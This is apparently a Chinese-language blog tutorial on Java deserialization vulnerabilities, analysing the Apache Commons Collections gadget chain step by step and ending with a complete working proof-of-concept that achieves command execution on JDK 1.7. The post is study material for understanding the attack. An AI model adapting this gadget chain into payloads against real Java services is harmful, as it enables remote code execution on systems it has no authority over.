---
layout: post
title: Java反序列化漏洞整理(一)
tags: java Web安全
typora-copy-images-to: ../assets/img
typora-root-url: ..
---

# Java反序列化漏洞整理(一)

## 发现

[Deserialization_Cheat_Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Deserialization_Cheat_Sheet.md)

- 白盒：可能出现的API包括:`XStream`,`readObject`, `readObjectNodData`, `readResolve` or `readExternal`等等
- 黑盒：HEX中出现`AC ED 00 05`，Content-type：`application/x-java-serialized-object`

## 利用

想要执行任意命令：

```java
Runtime.getRuntime().exec("calc");
```

使用反射获取的话就需要分成两部分，一部分是调用getRuntime(),一部分是调用exec();

```java
  Class class1=Runtime.class;
        Method getRuntime=class1.getMethod("getRuntime");
        Runtime runtime=(Runtime) getRuntime.invoke(null);
        //获得runtime实例
        Class class2=runtime.getClass();
        Method exec=class2.getMethod("exec", String.class);
        exec.invoke(runtime,"calc");
```

假设我们已经获取到了一个反序列化漏洞

我们可以控制这个类的实例，但是函数调用我们无法控制，和PHP反序列类似的，我们应该寻找在反序列化后会自动执行的函数。在Java的动态代理中，使用newProxy的代理后，在调用代理对象的方法时，会自动执行实现的InvocationHandler接口的invoke方法。

> 原则：**实例属性是我们可控的，函数调用是我们不可控的**。也就是所谓的POP(Property Oriented Programming)

#### 一个POP Gadget的分析

`org.apache.commons.collections.functors.InvokerTransformer#transform`

这个类继承了Transformer接口，并实现了transform方法

![1560782782828](/assets/img/1560782782828.png)

可以看到InvokerTransformer中的transform方法可以对一个输入类input通过反射调用其的一个方法，其中的MethodName以及ParamTypes还有Args都是InvokerTransformer的成员变量，所以是我们可以控制的。

但是这一个方法并不足以让我们执行命令

我们在包里寻找同样实现了Transformer接口的类

`org.apache.commons.collections.functors.ChainedTransformer`

![1560787877155](/assets/img/1560787877155.png)

其中的transform方法，可以看到这里就是一个链式调用transform的方法，可以满足我们RCE的要求。而这里的iTransformers是成员变量，也是我们可以控制的。

但是可以注意到，我们还需要先获取得到Runtime类的class,才能调用getMethod其的静态方法getRuntime。我们在寻找实现了Transformer接口的类，

`org.apache.commons.collections.functors.ConstantTransformer`中的transform方法，是直接返回这个类中的成员变量iConstant。

由于ConstantTransformer的transform方法的返回值是一个Class类型，所以这里我们只能利用反射来调用反射，听起来有点绕，直接看调用链就清楚了

到这里的利用链

![1560843125368](/assets/img/1560843125368.png)

接着我们需要寻找可以调用transform的地方。

`org.apache.commons.collections.map.LazyMap#get`

![1560857576938](C:\Users\牛奶冻荔枝\AppData\Roaming\Typora\typora-user-images\1560857576938.png)

调用了factory.transform(key)，而这里的factory是LazyMap的成员变量，也是我们可控的。

![1560925894050](/assets/img/1560925894050.png)

我们接着寻找get方法的调用，这里调用是比较普遍的，我们希望存在一个类，其实现了InvocationHandler接口，Invoke方法调用了get方法,同时其的调用者是一个成员变量，使我们可以控制的。

`sun.reflect.annotation.AnnotationInvocationHandler#invoke`

![1560912962249](/assets/img/1560912962249.png)

而这里的memberValues是我们可控的

![1560925421605](/assets/img/1560925421605.png)

这样，我们为一个对象创建代理对象，这个代理对象的InvocationHandler，我们使用构造的`AnnotationInvocation(Override.class,lazyMap)`即可。

接着我们还要寻找一个对象是在反序列化时，会自动调用其的某一个方法。在反序列化时自动调用readObject，

所以我们直接去找readObject。

还是在`sun.reflect.annotation.AnnotationInvocationHandler#readObject`

![1560928730834](/assets/img/1560928730834.png)

![1560928913641](/assets/img/1560928913641.png)

我们发现在readObject的过程中调用了memberValues的entrySet方法。而前面说过，这里的memberValues是我们可控的map，所以这里就明了了，我们需要创建的代理对象就是这个map，然后传递到AnnotationInvocationHandler中，最后反序列化这个AnnotationInvocationHandler。

Dlive总结的利用链：

![1560930436872](/assets/img/1560930436872-1560933390300.png)

#### payload以及测试结果：

```java
//jdk1.7

public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
        Transformer[] invokerTransformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},
                        new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(invokerTransformers);
        //chainedTransformer.transform(1);
        Map lazyMap=LazyMap.decorate(new HashMap(),chainedTransformer);
        //lazyMap.get(1);
        String annoInvocationReferce="sun.reflect.annotation.AnnotationInvocationHandler";
        //AnnotationInvocationHandler在sun包中我们无法直接调用,使用反射调用
        Constructor<?> constructor= Class.forName(annoInvocationReferce).getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler invocationHandler=(InvocationHandler) constructor.newInstance(Override.class,lazyMap);

        HashMap hashMap=new HashMap();
        //创建一个代理Map
        Map proxyMap= (Map)Proxy.newProxyInstance(
                hashMap.getClass().getClassLoader(),
                hashMap.getClass().getInterfaces(),
                invocationHandler
        );
        //需要反序列化的AnnotationInvocationHandler
        InvocationHandler invocationHandler1=(InvocationHandler)constructor.newInstance(Override.class,proxyMap);
        //测试
        try {
            ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
            ObjectOutputStream outputStream=new ObjectOutputStream(byteArrayOutputStream);
            outputStream.writeObject(invocationHandler1);
            ObjectInputStream inputStream=new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
            inputStream.readObject();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```

![1560930308651](/assets/img/1560930308651.png)

参考：

1. http://d1iv3.me/2018/06/05/CVE-2015-4852-Weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90/

## 总结

Gadget的分析还是挺好玩的，涉及到比较多关于java反射，代理以及反序列化的知识。利用链也非常巧妙。

关于一些现成的Gadget以及payload的生成可以使用ysoserial这个工具：https://github.com/frohoff/ysoserial  

留个坑，分析一下Weblogic的一些相关反序列化漏洞。







